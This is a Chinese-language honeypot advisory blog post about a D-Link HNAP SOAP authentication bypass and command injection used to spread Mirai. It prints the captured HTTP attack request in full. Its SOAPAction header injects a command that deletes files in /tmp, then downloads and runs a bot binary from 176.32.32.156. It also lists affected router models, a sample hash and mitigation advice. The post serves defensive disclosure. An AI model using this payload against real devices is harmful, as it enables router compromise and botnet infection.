---
layout:     post
title:      
subtitle:   
date:
author:     shenzhen_antiy_wly
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# D-Link HNAP SOAP 查询验证绕过漏洞通报

## 概述

2018年8月22日，安天蜜网捕获到利用D-Link HNAP SOAP 查询验证绕过漏洞的攻击流量，并关联到一个僵尸网络站点，监控到里面有bin僵尸程序，站点地址为：http://176.32.32.156.

## 漏洞描述

通过使用hxxp：//purenetworks.com/HNAP1/GetDeviceSettings可以创建一个可以绕过认证的SOAP查询。 另外，由于不正确的字符串处理，运行系统命令（导致任意代码执行）是可行的。 当两个问题结合在一起时，可以形成一个首先绕过认证的SOAP请求，然后导致任意代码执行.

## 捕获载荷

```
POST /HNAP1/ HTTP/1.0..Content-Type: text/xml; charset=\"utf-8\"..SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://176.32.32.156/bin && sh /tmp/bin`..Content-Length: 640....<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>..~
```



## 	攻击IP及URL

http://176.32.32.156/bin

## 样本



| 文件名 | 病毒家族 | Hash                             |
| ------ | -------- | -------------------------------- |
| bin    | Mirai    | 5ab32bdead9a6043f0db9ab7809be4f1 |



## 受影响范围



DAP-1522 revB

DAP-1650 revB

DIR-880L

DIR-865L

DIR-860L revA

DIR-860L revB

DIR-815 revB

DIR-300 revB

DIR-600 revB

DIR-645

TEW-751DR

TEW-733GR 





## 修复及防护建议



关闭HNAP或使用官网的固件补丁进行升级



## 参考资料



[1]     D-Link DIR-890L安全分析报告

<http://www.freebuf.com/vuls/64521.html>

[2]     Masuta : Satori 开发者的第二个僵尸网络，利用新的路由器漏洞实现武器化

<http://www.myzaker.com/article/5a6fc5b51bc8e0ac5a00000a/>

[3]     Hacking the D-Link DIR-890L

<http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/>